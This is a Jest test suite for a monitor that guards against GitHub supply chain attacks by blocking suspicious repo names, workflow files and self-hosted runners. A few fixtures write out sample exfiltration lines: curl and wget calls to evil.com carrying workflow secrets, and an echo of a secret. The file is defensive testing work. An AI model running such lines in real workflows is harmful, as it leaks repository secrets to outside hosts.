/**
 * Tests for GitHubApiMonitor
 * Verifies protection against GitHub-based supply chain attacks
 */

const { GitHubApiMonitor } = require('../lib/github-api-monitor');

describe('GitHubApiMonitor', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });
  
  describe('constructor', () => {
    it('should initialize with config', () => {
      const config = {
        githubApi: {
          monitorRepoCreation: true,
          monitorWorkflowCreation: true,
          blockedRepoNames: ['shai-hulud', 'secrets'],
          blockedWorkflowPatterns: ['discussion.yaml']
        }
      };
      
      const monitor = new GitHubApiMonitor(config, true);
      
      expect(monitor.enabled).toBe(true);
      expect(monitor.blockedRepoNames).toEqual(['shai-hulud', 'secrets']);
      expect(monitor.blockedWorkflowPatterns).toEqual(['discussion.yaml']);
    });
    
    it('should be disabled when not configured', () => {
      const config = {};
      const monitor = new GitHubApiMonitor(config, true);
      
      expect(monitor.enabled).toBe(false);
    });
  });
  
  describe('isGitHubApi', () => {
    let monitor;
    
    beforeEach(() => {
      const config = {
        githubApi: {
          monitorRepoCreation: true
        }
      };
      monitor = new GitHubApiMonitor(config, true);
    });
    
    it('should detect api.github.com', () => {
      expect(monitor.isGitHubApi('https://api.github.com/user/repos')).toBe(true);
    });
    
    it('should detect github.com/api', () => {
      expect(monitor.isGitHubApi('https://github.com/api/v3/user')).toBe(true);
    });
    
    it('should detect raw.githubusercontent.com', () => {
      expect(monitor.isGitHubApi('https://raw.githubusercontent.com/user/repo/file')).toBe(true);
    });
    
    it('should not detect non-GitHub domains', () => {
      expect(monitor.isGitHubApi('https://example.com/api')).toBe(false);
    });
  });
  
  describe('isRepoCreationRequest', () => {
    let monitor;
    
    beforeEach(() => {
      const config = {
        githubApi: {
          monitorRepoCreation: true
        }
      };
      monitor = new GitHubApiMonitor(config, true);
    });
    
    it('should detect user repo creation', () => {
      expect(monitor.isRepoCreationRequest('/user/repos', 'POST')).toBe(true);
    });
    
    it('should detect org repo creation', () => {
      expect(monitor.isRepoCreationRequest('/orgs/myorg/repos', 'POST')).toBe(true);
    });
    
    it('should not detect GET requests', () => {
      expect(monitor.isRepoCreationRequest('/user/repos', 'GET')).toBe(false);
    });
  });
  
  describe('checkRepoCreation', () => {
    let monitor;
    
    beforeEach(() => {
      const config = {
        githubApi: {
          monitorRepoCreation: true,
          blockedRepoNames: ['shai-hulud', 'secrets', 'credentials']
        }
      };
      monitor = new GitHubApiMonitor(config, true);
    });
    
    it('should block repos with blocked names', () => {
      const body = JSON.stringify({ name: 'shai-hulud' });
      const result = monitor.checkRepoCreation(body);
      
      expect(result.allowed).toBe(false);
      expect(result.type).toBe('REPO_CREATION');
      expect(result.reason).toBe('blocked_repo_name');
      expect(result.severity).toBe('critical');
    });
    
    it('should block repos containing blocked names', () => {
      const body = JSON.stringify({ name: 'my-secrets-repo' });
      const result = monitor.checkRepoCreation(body);
      
      expect(result.allowed).toBe(false);
      expect(result.repoName).toContain('secrets');
    });
    
    it('should allow repos with safe names', () => {
      const body = JSON.stringify({ name: 'my-awesome-project' });
      const result = monitor.checkRepoCreation(body);
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('repo_name_allowed');
    });
    
    it('should handle object body', () => {
      const body = { name: 'secrets' };
      const result = monitor.checkRepoCreation(body);
      
      expect(result.allowed).toBe(false);
    });
    
    it('should handle missing repo name', () => {
      const body = JSON.stringify({ description: 'A repo' });
      const result = monitor.checkRepoCreation(body);
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('no_repo_name');
    });
    
    it('should be case-insensitive', () => {
      const body = JSON.stringify({ name: 'SHAI-HULUD' });
      const result = monitor.checkRepoCreation(body);
      
      expect(result.allowed).toBe(false);
    });
  });
  
  describe('checkWorkflowCreation', () => {
    let monitor;
    
    beforeEach(() => {
      const config = {
        githubApi: {
          monitorWorkflowCreation: true,
          blockedWorkflowPatterns: ['discussion.yaml', 'self-hosted']
        }
      };
      monitor = new GitHubApiMonitor(config, true);
    });
    
    it('should block workflows with blocked filenames', () => {
      const pathname = '/repos/user/repo/contents/.github/workflows/discussion.yaml';
      const body = JSON.stringify({ content: 'name: Test' });
      
      const result = monitor.checkWorkflowCreation(pathname, body);
      
      expect(result.allowed).toBe(false);
      expect(result.type).toBe('WORKFLOW_CREATION');
      expect(result.reason).toBe('blocked_workflow_filename');
      expect(result.severity).toBe('high');
    });
    
    it('should block workflows with blocked content patterns', () => {
      const pathname = '/repos/user/repo/contents/.github/workflows/ci.yaml';
      const body = JSON.stringify({ 
        content: Buffer.from('runs-on: self-hosted').toString('base64')
      });
      
      const result = monitor.checkWorkflowCreation(pathname, body);
      
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe('blocked_workflow_content');
    });
    
    it('should allow safe workflows', () => {
      const pathname = '/repos/user/repo/contents/.github/workflows/test.yaml';
      const body = JSON.stringify({ 
        content: Buffer.from('runs-on: ubuntu-latest').toString('base64')
      });
      
      const result = monitor.checkWorkflowCreation(pathname, body);
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('workflow_allowed');
    });
  });
  
  describe('containsSuspiciousWorkflowContent', () => {
    let monitor;
    
    beforeEach(() => {
      const config = {
        githubApi: {
          monitorWorkflowCreation: true
        }
      };
      monitor = new GitHubApiMonitor(config, true);
    });
    
    it('should detect self-hosted runners', () => {
      const content = 'runs-on: self-hosted';
      expect(monitor.containsSuspiciousWorkflowContent(content)).toBe(true);
    });
    
    it('should detect self-hosted in array', () => {
      const content = 'runs-on: [ubuntu-latest, self-hosted]';
      expect(monitor.containsSuspiciousWorkflowContent(content)).toBe(true);
    });
    
    it('should detect secret exfiltration via curl', () => {
      const content = 'curl http://evil.com?token=${{ secrets.GITHUB_TOKEN }}';
      expect(monitor.containsSuspiciousWorkflowContent(content)).toBe(true);
    });
    
    it('should detect secret exfiltration via wget', () => {
      const content = 'wget http://evil.com?key=${{ secrets.API_KEY }}';
      expect(monitor.containsSuspiciousWorkflowContent(content)).toBe(true);
    });
    
    it('should detect secret exfiltration via echo', () => {
      const content = 'echo ${{ secrets.PASSWORD }}';
      expect(monitor.containsSuspiciousWorkflowContent(content)).toBe(true);
    });
    
    it('should allow safe workflows', () => {
      const content = `
name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - run: npm test
      `;
      expect(monitor.containsSuspiciousWorkflowContent(content)).toBe(false);
    });
  });
  
  describe('checkGitHubApiRequest', () => {
    let monitor;
    
    beforeEach(() => {
      const config = {
        githubApi: {
          monitorRepoCreation: true,
          monitorWorkflowCreation: true,
          blockedRepoNames: ['shai-hulud'],
          blockedWorkflowPatterns: ['discussion.yaml']
        },
        reporting: {
          logFile: 'test-firewall.log'
        }
      };
      monitor = new GitHubApiMonitor(config, true);
    });
    
    it('should allow non-GitHub URLs', () => {
      const result = monitor.checkGitHubApiRequest(
        'https://npmjs.org/package/test',
        'GET',
        '',
        {}
      );
      
      expect(result.allowed).toBe(true);
      expect(result.reason).toBe('not_github_api');
    });
    
    it('should check repo creation', () => {
      const result = monitor.checkGitHubApiRequest(
        'https://api.github.com/user/repos',
        'POST',
        JSON.stringify({ name: 'shai-hulud' }),
        {}
      );
      
      expect(result.allowed).toBe(false);
      expect(result.type).toBe('REPO_CREATION');
    });
    
    it('should check workflow creation', () => {
      const result = monitor.checkGitHubApiRequest(
        'https://api.github.com/repos/user/repo/contents/.github/workflows/discussion.yaml',
        'PUT',
        JSON.stringify({ content: 'test' }),
        {}
      );
      
      expect(result.allowed).toBe(false);
      expect(result.type).toBe('WORKFLOW_CREATION');
    });
    
    it('should track statistics', () => {
      monitor.checkGitHubApiRequest(
        'https://api.github.com/user/repos',
        'POST',
        JSON.stringify({ name: 'safe-repo' }),
        {}
      );
      
      expect(monitor.stats.apiCalls).toBe(1);
      expect(monitor.stats.repoCreationAttempts).toBe(1);
    });
    
    it('should log blocked requests', () => {
      monitor.checkGitHubApiRequest(
        'https://api.github.com/user/repos',
        'POST',
        JSON.stringify({ name: 'shai-hulud' }),
        {}
      );
      
      expect(monitor.stats.blocked).toBe(1);
      expect(monitor.activityLog.length).toBe(1);
    });
  });
  
  describe('getStats', () => {
    it('should return statistics', () => {
      const config = {
        githubApi: {
          monitorRepoCreation: true
        }
      };
      
      const monitor = new GitHubApiMonitor(config, true);
      
      monitor.checkGitHubApiRequest(
        'https://api.github.com/user/repos',
        'POST',
        JSON.stringify({ name: 'test-repo' }),
        {}
      );
      
      const stats = monitor.getStats();
      
      expect(stats.apiCalls).toBe(1);
      expect(stats.repoCreationAttempts).toBe(1);
      expect(stats.recentActivity).toBeDefined();
    });
  });
  
  describe('generateReport', () => {
    it('should generate comprehensive report', () => {
      const config = {
        githubApi: {
          monitorRepoCreation: true,
          monitorWorkflowCreation: true,
          blockedRepoNames: ['shai-hulud'],
          blockedWorkflowPatterns: ['discussion.yaml']
        }
      };
      
      const monitor = new GitHubApiMonitor(config, true);
      
      const report = monitor.generateReport();
      
      expect(report.enabled).toBe(true);
      expect(report.monitoring.repoCreation).toBe(true);
      expect(report.monitoring.workflowCreation).toBe(true);
      expect(report.blockedPatterns.repoNames).toEqual(['shai-hulud']);
      expect(report.stats).toBeDefined();
    });
  });
  
  describe('integration with console output', () => {
    let consoleErrorSpy;
    
    beforeEach(() => {
      consoleErrorSpy = jest.spyOn(console, 'error').mockImplementation();
    });
    
    afterEach(() => {
      consoleErrorSpy.mockRestore();
    });
    
    it('should output alert when blocking repo creation', () => {
      const config = {
        githubApi: {
          monitorRepoCreation: true,
          blockedRepoNames: ['shai-hulud']
        }
      };
      
      const monitor = new GitHubApiMonitor(config, false);
      
      monitor.checkGitHubApiRequest(
        'https://api.github.com/user/repos',
        'POST',
        JSON.stringify({ name: 'shai-hulud' }),
        {}
      );
      
      expect(consoleErrorSpy).toHaveBeenCalled();
      expect(consoleErrorSpy.mock.calls.some(call => 
        call[0].includes('GITHUB API ATTACK DETECTED')
      )).toBe(true);
    });
  });
});
